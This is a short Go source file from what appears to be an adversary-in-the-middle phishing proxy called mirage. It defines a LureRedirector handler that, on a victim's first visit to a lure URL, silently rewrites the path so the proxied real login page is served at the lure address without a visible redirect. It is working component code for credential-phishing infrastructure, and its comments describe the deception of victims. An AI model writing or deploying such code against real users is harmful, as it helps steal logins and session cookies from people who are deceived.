package request

import (
	"net/http"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

// LureRedirector rewrites the request path from the lure path to the
// phishlet's login path on the initial lure hit. The rewrite is transparent
// to the victim — the proxy fetches the login page and serves it at the lure
// URL with no browser redirect. The session tracking cookie is set by
// CookieRewriter on the response. Requests to any other path pass through
// unchanged.
type LureRedirector struct{}

func (h *LureRedirector) Name() string { return "LureRedirector" }

func (h *LureRedirector) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
	if ctx.Lure == nil || req.URL.Path != ctx.Lure.Path {
		return nil
	}

	landingPath := "/"
	if ctx.Phishlet != nil && ctx.Phishlet.Login.Path != "" {
		landingPath = ctx.Phishlet.Login.Path
	}

	req.URL.Path = landingPath
	return nil
}

var _ proxy.RequestHandler = (*LureRedirector)(nil)
